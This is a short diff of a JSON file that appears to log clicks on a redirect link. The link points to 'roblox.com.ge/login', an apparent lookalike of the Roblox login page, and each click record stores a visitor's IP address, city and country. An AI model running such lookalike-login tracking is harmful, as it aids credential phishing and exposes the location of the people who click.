@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1118,
+    "useCount": 1119,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9083,6 +9083,14 @@
       },
       {
         "timestamp": 1777270501201,
+        "ip": "27.34.68.108",
+        "country": "Nepal",
+        "city": "Kathmandu",
+        "flag": "🇳🇵",
+        "countryCode": "NP"
+      },
+      {
+        "timestamp": 1777270507071,
         "ip": "27.34.68.108",
         "country": "Nepal",
         "city": "Kathmandu",
